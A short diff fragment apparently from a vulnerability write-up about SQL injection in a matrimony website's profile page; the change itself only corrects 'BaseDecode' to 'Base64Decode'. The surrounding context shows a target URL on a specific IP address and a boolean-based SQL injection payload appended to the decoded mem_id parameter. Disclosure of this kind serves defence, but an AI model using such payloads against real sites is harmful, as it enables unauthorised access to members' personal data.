@@ -68,7 +68,7 @@ The original parameter:
 http://74.124.215.220/~projclient/client/muslim-matrimony/view-rofile.php?mem_id=NDk=
 ```
 
-BaseDecode the parameter, and add payload:
+Base64Decode the parameter, and add payload:
 
 ```
 http://74.124.215.220/~projclient/client/muslim-matrimony/view-rofile.php?mem_id=49' AND 6882=6882 AND 'qpug'='qpug
